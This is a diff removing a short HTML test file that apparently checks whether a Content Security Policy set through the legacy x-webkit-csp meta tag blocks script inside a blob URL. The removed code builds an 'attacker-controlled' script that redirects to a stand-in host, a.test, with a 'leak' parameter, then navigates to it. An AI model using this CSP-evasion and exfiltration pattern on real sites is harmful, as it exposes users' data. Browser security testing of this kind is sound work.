@@ -1,8 +1,0 @@
-<meta http-equiv="x-webkit-csp" content="script-src 'nonce-test'" />
-<script nonce="test">
-  var attackerControlledString =
-    "<script>document.location='https://a.test/report/?leak=c894228-x-webkit-csp'<\/script>";
-  var blob = new Blob([attackerControlledString], { type: "text/html" });
-  var url = URL.createObjectURL(blob);
-  location.href = url;
-</script>
